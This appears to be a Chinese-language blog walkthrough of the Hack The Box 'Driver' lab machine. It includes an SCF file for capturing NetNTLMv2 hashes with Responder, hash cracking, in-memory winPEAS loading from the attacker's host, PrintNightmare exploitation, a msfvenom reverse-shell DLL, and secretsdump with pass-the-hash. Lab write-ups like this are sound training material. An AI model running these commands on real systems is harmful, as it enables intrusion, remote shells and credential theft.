+++
date = '2025-07-18T19:25:26+08:00'
draft = false
title = 'HTB Drive'
+++

这是一台发布于2021年12月2日的靶机，HTB投票结果显示这台靶机为easy难度，Driver涉及到针对smb服务，利用scf文件，触发smb服务的NTLMv2协议，从而拿到初始凭证，通过开放的winrm端口登陆之后，提权过程中利用2021年6月8日发布的针对windows print spooler产生的提权漏洞，从而实现从普通用户提升到`nt authority\system`权限, 最后使用net user配合impacket-secretdump进行持久化权限，这个持久化方式在实战中不推荐使用

关于windows print spooler的漏洞，详细内容可以参考这篇博客[0xdf](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html), 在后文也有提到
#### Recon

nmap扫描的时候用-sS反而特别慢, 一直扫不出结果

```bash
sudo nmap --min-rate 10000 -sT -p- $ip -oA nmapscan/ports
```

如果实在太慢的话用[rustscan](https://github.com/bee-san/RustScan/releases/download/2.4.1/rustscan.deb.zip)好了

```bash
sudo apt install ./rustscan_2.4.1-1_amd64.deb -y
rustscan -a $ip
---
Open 10.10.11.106:80
Open 10.10.11.106:135
Open 10.10.11.106:445
```

访问80端口的页面，存在基于HTTP头的身份验证，`Basic Authorization`，使用弱密码成功登录

```bash
admin, admin
```

或者也可以使用nmap的http爆破脚本

```bash
└─$ nmap --script=http-brute -p 80 10.10.11.106
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 12:15 EDT
NSE: [http-brute] usernames: Time limit 10m00s exceeded.
NSE: [http-brute] usernames: Time limit 10m00s exceeded.
NSE: [http-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for driver.htb (10.10.11.106)
Host is up (0.24s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-brute: 
|   Accounts: 
|     admin:admin - Valid credentials
|_  Statistics: Performed 1244 guesses in 609 seconds, average tps: 3.0
```

看到一个域名`driver.htb`, 并且页面本身可以上传文件，成功上传了php木马，找一下上传的位置。brupsuite抓包一下身份凭证, 在HTTP Header中带上

```bash 
feroxbuster -u http://driver.htb/ -H "Authorization: Basic YWRtaW46YWRtaW4=" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 
```

爆破半天也没能找到任何上传的点位或者上传的php文件，如果服务器把上传的目录设置成一个特别的名字，那么扫不到这个路径是很正常的

#### smb服务枚举

```bash
enum4linux-ng -A driver.htb

└─$ nxc smb driver.htb --shares -u 'anonymous' -p ''
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
SMB         10.10.11.106    445    DRIVER           [-] DRIVER\anonymous: STATUS_LOGON_FAILURE 
```

能看到smb服务没能成功枚举到什么内容
#### SMB Server sniff NTLM离线破解 sfc诱导

这时已知存在smb服务，并且web页面的`file share`关键字表示，大概率传上去的文件会给到smb服务用于共享，经过一些对于smb服务的枚举，没能找到任何登录smb服务的方式。

但是当smb服务访问UNC路径时(比如 \\\\10.10.10.10\\shares)，会自动带上NTLM凭证尝试认证以访问这个共享文件。

另一个需要清楚的是，内网中并不是一直都使用DNS来进行解析，如果DNS解析不成功，那么会自动降级为NetBIOS和LLMNR协议，smb会使用这种协议，除非windows的安全策略里直接禁用了这些协议。那么当smb服务访问一个DNS解析无法处理的地址的时候，自动降级为NetBIOS和LLMNR这样的广播协议，从而让responder抓取到访问向kali网卡的流量，其中正携带的NTLM密文。

总结一下利用流程:
1. 上传一个可以触发DNS查询失败的，访问UNC的请求（比如scf文件），这个UNC指向kali的地址
2. DNS解析主机名失败后smb自动降级使用LLMNR和NetBIOS这种广播协议，其中smb会自动携带NTLM密文企图通过认证
3. responder监听kali的网卡流量，smb服务认为responder是正常的另一个smb服务，从而发送NTLM凭证，使得responder可以截获smb服务的NTLM密文
4. hashcat或者john破解NTLM

##### 设置responder

记得把445端口的服务关闭一下再运行responder

```bash
sudo responder -I tun0
```
也可以运行`sudo responder -I tun0 -v`, 这样不会屏蔽掉重复的NTLM凭证
##### 上传scf文件

```bash
[Shell]
Command=2
IconFile=\\10.10.16.5\shares
[Taskbar]
Command=Explorer
```

#### 破解NTLM密文

这里这个NTLM是不能直接作为hash传入的，因为此处NTLM不仅有服务端和客户端的挑战，还带有时间戳，导致虽然是一样的用户名密码，但是不同时间点得到的NTLM凭证的值都是不同的。

##### nth交叉验证密文类型，使用hashcat爆破

```bash
nth --file digest


https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

tony::DRIVER:3925a13b425e9051:1D11CCE38B012107E5186803C3EFA21A:0101000000000000809CC
9C18FEADB01C5CCA56D5CDF3DC100000000020008004600360051004C0001001E00570049004E002D004
A004F004700530033003900300038004A0050004C0004003400570049004E002D004A004F00470053003
3003900300038004A0050004C002E004600360051004C002E004C004F00430041004C000300140046003
60051004C002E004C004F00430041004C00050014004600360051004C002E004C004F00430041004C000
7000800809CC9C18FEADB0106000400020000000800300030000000000000000000000000200000560E8
9B92C41F2159FCFA8C591B30D366CB1D5C8571AE52904511B6DEE4553220A00100000000000000000000
00000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000
00000000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2
```

```bash
hashcat --help | grep -i ntlm
5600 | NetNTLMv2                                                  | Network Protocol

hashcat -m 5600 digest /usr/share/wordlists/rockyou.txt 
```

这里虚拟机没有显卡，hashcat提示显存不足直接失败了，换了fastcrack这个小字典一样不行
##### john 破解
```bash
john --format=netntlmv2 digest --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot
```

`--pot`参数指定pot文件的名字，这样面对同一个文件的爆破，不同pot名称即可实现对同一个文件多次爆破

```bash
john --format=netntlmv2 digest --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot
liltony          (tony)
```

#### 登录winrm

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony -P 5985
```

##### user flag
查找user.txt
```powershell
Get-ChildItem -Path C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue
```

或者使用简写: `gci -r -file c:\users`，或者使用type也可以

```powershell
type C:\Users\tony\Desktop\user.txt
```

#### 提权

##### winpeas枚举

设置运行脚本执行，无文件执行[winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)
```powershell
set-executionpolicy unrestricted -scope currentuser

$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.14.14/winPEASx64.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

-UseBasicParsing: 如果没有装IE浏览器,使用基本解析方式可以保证下载执行,或者浏览器初始化过程没有操作过,使用这个参数规避掉这个问题

这里没成功执行提权程序，那么下载文件到本地再执行

可以通过certutil.exe或者evil-winrm来下载文件

```powershell
certutil.exe -urlcache -split -f http://10.10.14.14/winPEASx64.exe
# 通过evil-winrm来传递文件
upload winPEASx64.exe
```

执行自动枚举脚本并将结果返回到kali

```powershell
.\winPEASx64.exe log
```

指定log参数，默认将结果输出文件名为out.txt, 通过evil-winrm将文件下载回kali分析

```powershell
download out.txt
cat out.txt | less -R 
batcat out.txt
```

```powershell
PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

一条添加打印机的命令，接口是并行端口，名为`lpt1`,在后续列出的进程当中能看到spoolsv这个打印机的进程

##### printnightmare提权

spoolsv是windows用来管理打印机任务的进程，是打印后台处理程序的核心进程，duckduckgo搜索一下`windows spoolsv exploit`, 能看到一个高频出现的漏洞`printnightmare`, 可以使用nxc查看一下这台靶机是否可以利用`printnightmare`

关于`printnightmare`的更多细节可以查看这篇[博客](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)

###### nxc模块检测printnightmare可用性

可以使用nxc的模块检测一下是不是可以进行printnightmare提权

```bash
└─$ nxc smb driver.htb -u tony -p liltony -M printnightmare
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
PRINTNIG... 10.10.11.106    445    DRIVER           Vulnerable, next step https://github.com/ly4k/PrintNightmare
```

###### Exploit

我这里直接使用JohnHammond所编写的利用[脚本](https://github.com/calebstewart/CVE-2021-1675/commits?author=JohnHammond)，当然也可以通过自定义dll文件来实现其他的利用方式

```bash
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1
```

```powershell
upload CVE-2021-1675.ps1
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -NewUser "printer" -NewPassword "Pass@word!"
```

这里创建用户后是administrator用户，但是使用evil-winrm登录时候无法登录，可能是限制了administrator权限的用户通过winrm远程登录，这样的话可以自定义一个反弹shell的dll文件，通过printnightmare允许这个dll文件

##### msfvenom生成dll

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f dll -o reverse.dll
sudo rlwrap -Ac nc -lvnp 443
```

```powershell
upload reverse.dll
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DLL "C:\programdata\apps\reverse.dll"
```

执行之后拿下system32权限
#### root.txt

```bash
type C:\users\administrator\desktop\root.txt
```

#### 持久化

通过net user建立一个administrator组的用户，来实现持久化权限（这种方式实战中不推荐使用，很容易被查到）

```powershell
net user drive Pass@word! /add
net localgroup administrators drive /add
```

##### 使用impacket工具包dump hash

```bash
sudo impacket-secretsdump 'drive:Pass@word!'@driver.htb
# 用户名:RID:LM哈希:NT哈希:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
```

通过secretdump脚本拿到了administrator用户的NTLM哈希，可以通过这个哈希来登录administrator用户(Pass-the-hash)

```bash
sudo nxc winrm driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017
```




















